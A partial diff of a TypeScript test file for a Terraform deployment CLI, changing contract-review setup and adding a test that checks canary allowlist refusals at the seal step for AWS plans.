   behave({ applyAdvance: true });
   const contractPath = join(fresh("contract"), "act-pilot-contract.json");
-  writePinnedContract(contractPath, awsContractJson(KILL));
+  writeReviewedContract(contractPath, awsContractJson(KILL));
   const vault = fresh("cli-vault");
   const evidenceDir = fresh("cli-evidence");
   const nonces = openNonceStore(fresh("cli-nonces"));
@@ -640,7 +878,7 @@ test("./alz apply qualify, seal, approve and apply work for an AWS contract with
     const out: string[] = []; const err: string[] = [];
     const term = terminal(answers);
     const code = await runApplyCommand(args, {
-      terminal: term, env: awsIdentityEnv(environment), now: () => NOW, operatorId: "operator.fixture", contractPath, contractPinPath: pinPathOf(contractPath),
+      terminal: term, env: awsIdentityEnv(environment), now: () => NOW, operatorId: "operator.fixture", contractPath,
       qualificationDir: vault, evidenceDir, nonces, scratchParent: scratch, toolDirs: [toolDir], sourceCommit: SOURCE_COMMIT, stdout: (t: string) => { out.push(t); }, stderr: (t: string) => { err.push(t); },
     });
     return { code, stdout: out.join(""), stderr: err.join(""), shown: term.out.join("") };
@@ -667,7 +905,7 @@ test("./alz apply qualify, seal, approve and apply work for an AWS contract with
   for (const environment of ["DEV", "QA", "PROD"] as const) {
     const target = awsTargetOf(environment);
     const p = writeProject(fresh("project"), target, SHARED_TF);
-    const sealed = await cli(["seal", "--request", requestFor(p, environment), "--manifest", json(p.manifest)], [targetString(target), "RUN PROJECT CODE"], environment);
+    const sealed = await cli(["seal", "--request", requestFor(p, environment), "--manifest", json(p.manifest), ...requesterArgs()], [targetString(target), "RUN PROJECT CODE"], environment);
     assert.equal(sealed.code, 0, sealed.stderr);
     const result = JSON.parse(sealed.stdout) as { artifactSha256: string; sealedPlanPath: string; reviewBundlePath: string };
     const signers = environment === "PROD" ? ["alice", "bob"] as const : ["alice"] as const;
@@ -687,4 +925,26 @@ test("./alz apply qualify, seal, approve and apply work for an AWS contract with
     assert.equal(applied.code, 0, environment + " " + applied.stderr);
   }
   assert.equal(applyCalls().length, 3);
+});
+
+test("canary (AWS Terraform, owner decision E1): an IAM role beside the allowlisted log group, a second log group, or an update of an existing one is RESOURCE_NOT_IN_CANARY at seal; a contract that authorizes APPLY with no allowlist is CANARY_ALLOWLIST_MISSING", async () => {
+  const create = (address: string) => ({ address, type: address.split(".")[0], change: { actions: ["create"], before: null, after: {} } });
+  for (const [label, behavior, said] of [
+    ["an IAM role", { showResources: [create("aws_iam_role.app")] }, /aws_iam_role\.app: type aws_iam_role is not in the canary allowlist/],
+    ["a second log group", { showResources: [create("aws_cloudwatch_log_group.second")] }, /aws_cloudwatch_log_group: the plan creates 2, the canary allowlist names exactly 1/],
+    ["an update of an existing log group", { showUpdate: true }, /aws_cloudwatch_log_group\.existing \(aws_cloudwatch_log_group\): the plan would \["update"\] it/],
+  ] as const) {
+    const w = world();
+    behave(behavior as Behavior);
+    const refusal = await sealRefusal(w, "DEV");
+    refused(refusal as never, "RESOURCE_NOT_IN_CANARY");
+    assert.match((refusal as { message: string }).message, said, label);
+  }
+  const contract = awsContractJson(KILL) as { targets: Record<string, Record<string, unknown>> };
+  delete contract.targets.DEV.canary;
+  const w = world(contract);
+  behave({});
+  const missing = await sealRefusal(w, "DEV");
+  refused(missing as never, "CANARY_ALLOWLIST_MISSING");
+  assert.equal(callsOf(toolDir).length, 0, "no engine step ran");
 });
